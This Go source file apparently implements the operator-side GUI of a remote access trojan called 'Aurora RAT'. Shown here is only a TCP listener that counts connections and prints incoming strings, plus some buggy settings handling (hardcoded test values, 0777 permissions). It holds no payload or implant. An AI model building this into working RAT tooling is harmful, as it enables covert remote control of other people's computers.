package main

import (
	"github.com/dontpanic92/wxGo/wx"
	"strconv"
	"fmt"
	"net"
	"runtime"
	"bufio"
	"os/user"
	"os"
	"encoding/json"
	"path/filepath"
	"io/ioutil"
)

var server Aurora
var gui *AuroraFrame

type Aurora struct {
	// ln is shortened "listener"
	ln net.Listener

	// cl is shortened "currently listening"
	curListen bool

	// Aurora Settings Directory
	settingsDir string
	settingsFile string

	// Aurora Settings
	config Config
}

type AuroraFrame struct {
	wx.Frame
	statusbar wx.StatusBar
	toolbar   wx.ToolBar
	menubar   wx.MenuBar

	menuItemListen wx.MenuItem

	listenBtn    wx.Button

	liveConns int
}

type Config struct {
	Host string `json:"host"`
	Port string `json:"port"`
}

func main() {

	server = newAurora()
	gui = newFrame()

	server.loadSettings()

	wx1 := wx.NewApp()
	gui.Show()
	wx1.MainLoop()
	gui.Destroy()
}

func newAurora() Aurora {
	self := Aurora{}
	self.curListen = false
	usr, err := user.Current()
	if err != nil {
		fmt.Println(err)
	}
	self.settingsDir, _ = filepath.Abs(usr.HomeDir + "\\Aurora")
	self.settingsFile, _ = filepath.Abs(self.settingsDir + "\\settings.json")

	return self
}

// Aurora GUI Functions

func newFrame() *AuroraFrame {
	self := &AuroraFrame{}

	self.liveConns = 0

	self.Frame = wx.NewFrame(wx.NullWindow, -1, "Aurora RAT", wx.DefaultPosition, wx.NewSizeT(800, 600))
	bSizer := wx.NewBoxSizer(wx.VERTICAL)


	// Status bar
	self.statusbar = self.CreateStatusBar()
	self.statusbar.SetStatusText("Not Currently Listening.")

	self.statusbar.SetFieldsCount(2)
	self.statusbar.SetStatusText("Live Connections: " + strconv.Itoa(self.liveConns), 1)


	// Menu bar
	self.menubar = wx.NewMenuBar()

	// Menu bar menus
	menuFile := wx.NewMenu()

	menuSettings := wx.NewMenu()

	// File menu
	self.menuItemListen = wx.NewMenuItem(menuFile, wx.ID_ANY, "&Start Listening", "Start Listening", wx.ITEM_NORMAL)
	menuFile.Append(self.menuItemListen)
	menuItemExit := wx.NewMenuItem(menuFile, wx.ID_ANY, "&Exit", "Exit", wx.ITEM_NORMAL)
	menuFile.Append(menuItemExit)

	// Settings menu
	menuItemSave := wx.NewMenuItem(menuSettings, wx.ID_ANY, "&Save Settings", "Save Settings", wx.ITEM_NORMAL)
	menuSettings.Append(menuItemSave)


	// Finish up menus
	self.menubar.Append(menuFile, "&File")
	self.menubar.Append(menuSettings, "&Settings")

	self.SetMenuBar(self.menubar)

	wx.Bind(self, wx.EVT_MENU, gui.eventSetListening, self.menuItemListen.GetId())
	wx.Bind(self, wx.EVT_MENU, server.saveSettings, menuItemSave.GetId())

	self.SetSizer(bSizer)
	self.Layout()

	return self
}

func (gui *AuroraFrame) eventSetListening(_ wx.Event) {

	liveConns := make(chan int)

	go server.setListening(liveConns)
	go gui.updateLiveConnections(liveConns)
}

func (gui *AuroraFrame) updateLiveConnections(liveConns chan int) {
	for i := range liveConns {
		gui.liveConns += i
		gui.statusbar.SetStatusText("Live Connections: " + strconv.Itoa(gui.liveConns), 1)
	}

}

// Aurora Backend Functions

func (a *Aurora) loadSettings() {
	configFile, err := ioutil.ReadFile(a.settingsFile)
	if os.IsNotExist(err) {
		_, err := os.Stat(a.settingsDir)
		if os.IsNotExist(err) {
			os.MkdirAll(a.settingsDir, os.ModeDir)
		}
		os.Create(a.settingsFile)
		jsonData, err := json.Marshal(Config{
			Host: "127.0.0.1",
			Port: ":4371",
			})
		if err != nil {
			fmt.Println(err)
		}
		ioutil.WriteFile(a.settingsFile, jsonData, 0777)
		json.Unmarshal(configFile, &a.config)
	} else if err != nil {
		fmt.Println(err)
	} else {
		json.Unmarshal(configFile, &a.config)
	}
}

func (server *Aurora) saveSettings(_ wx.Event) {
	jsonData, err := json.Marshal(Config{
		Host: "Test",
		Port: ":123",
		})
	if err != nil {
		fmt.Println(err)
	}
	ioutil.WriteFile(server.settingsFile, jsonData, 0777)
}

func (server *Aurora) setListening(liveConns chan int) {

	ln := make(chan bool)

	go server.SetListening(ln, liveConns)

	listening := <- ln

	if listening == true {
		gui.statusbar.SetStatusText("Currently Listening.")
		gui.menuItemListen.SetHelp("Stop Listening")
		gui.menuItemListen.SetItemLabel("Stop Listening")
		wx.MessageBox("Started Listening.")
	} else {
		gui.statusbar.SetStatusText("Not Currently Listening.")
		gui.menuItemListen.SetHelp("Start Listening")
		gui.menuItemListen.SetItemLabel("Start Listening")
		wx.MessageBox("Stopped Listening.")
	}
}

func (a *Aurora) SetListening(cln chan bool, liveConns chan int) bool {
	a.curListen = !a.curListen
	switch a.curListen {
	case false:
		if err := a.ln.Close(); err != nil {
			fmt.Println(err)
		}
		break
	case true:
		go a.startListening(liveConns)
		break
	}

	cln <- a.curListen
	close(cln)

	return a.curListen
}

func (a *Aurora) startListening(liveConns chan int) {

	var err error

	a.ln, err = net.Listen("tcp", a.config.Port)

	if err != nil {
		fmt.Println(err)
	}

	for {
		if !a.curListen {
			runtime.Goexit()
		}

		conn, err := a.ln.Accept()

		if err != nil {
			fmt.Println(err)
		} else if conn != nil {
			liveConns <- 1
			go a.receive(conn, liveConns)
		}

	}
}

func (a *Aurora) receive(conn net.Conn, liveConns chan int) {
	connected := true

	for {
		if !a.curListen {
			if connected {
				connected = false
			}
			liveConns <- -1
			runtime.Goexit()
		}

		rw := bufio.NewReadWriter(bufio.NewReader(conn), bufio.NewWriter(conn))
		str, err := rw.ReadString('\\')
		if err != nil {
			if connected{
				connected = false
			}
			liveConns <- -1
			fmt.Println(err)
			runtime.Goexit()
		}
		rw.Flush()
		fmt.Println(str)
	}
}